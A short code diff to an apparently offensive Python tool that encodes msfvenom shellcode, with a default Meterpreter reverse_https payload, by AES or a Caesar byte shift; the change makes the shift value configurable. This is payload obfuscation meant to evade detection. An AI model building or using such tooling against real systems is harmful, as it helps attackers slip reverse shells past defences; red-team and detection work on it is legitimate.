@@ -88,10 +88,11 @@ def aes_encrypt():
 # perform caesar shift 13 places (caesar-13) with bitwise AND to key value within 0-255
 def caesar_shift():
     try:
+        shiftval = args.shift
         raw_sc = args.infile
         raw_shell = bytearray(read_sc(raw_sc))
         for i in range(len(raw_shell)):
-            raw_shell[i] = ((raw_shell[i] + 13) & 0xff)
+            raw_shell[i] = ((raw_shell[i] + int(shiftval)) & 0xff)
         global crypt
         crypt = raw_shell
     except Exception as error:
@@ -386,6 +387,7 @@ if __name__ == "__main__":
     parser.add_argument('-t', '--type', default='windows/x64/meterpreter/reverse_https', help='Payload format (default: windows/x64/meterpreter/reverse_https)')
     parser.add_argument('-o', '--outfile', default='/tmp/raw_sc', help='Raw shellcode output file (default: tmp/raw_sc)')
     parser.add_argument('-g', '--generate', action='store_true', help='Generate msfvenom shellcode. Must specify: -l, -p, -t')
+    parser.add_argument('-s', '--shift', default='13', help='Number of values to shift the caesar cipher by. Must specify: -s')
     global args
     args = parser.parse_args()
     if len(argv) == 1:
